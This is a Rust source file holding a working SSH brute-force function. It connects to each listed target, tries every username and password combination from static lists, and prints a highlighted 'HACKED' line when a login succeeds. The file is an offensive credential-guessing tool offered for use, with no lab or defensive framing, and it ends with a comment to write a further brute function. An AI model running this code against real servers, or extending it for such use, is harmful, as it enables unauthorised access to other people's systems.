use std::net::TcpStream;
use ssh2::Session;

pub fn ssh(target: Vec<String>, usernames: &'static [&'static str], passwords: &'static [&'static str]) {
    for target in target {

        'brutessh: for user in usernames {
            // for every combination of username and password, try and ssh
            for pass in passwords {
                let tcp = TcpStream::connect(&target).unwrap();
                let mut sess = Session::new().unwrap();
                sess.set_tcp_stream(tcp);
                sess.handshake().unwrap();

                let did_it_work = sess.userauth_password(&user, &pass);

                match did_it_work { //if ssh returns OK(), then it is hacked, otherwise, it isn't
                    Err(_) => println!("failed: {} - {}/{}", &target, user, pass),
                    Ok(_) => {
                        println!("\x1b[93mHACKED {} - {}/{}\x1b[0m", &target, user, pass);
                        break 'brutessh;
                    },
                }
            }
        }
    }
}

/*
    write the brute function
*/
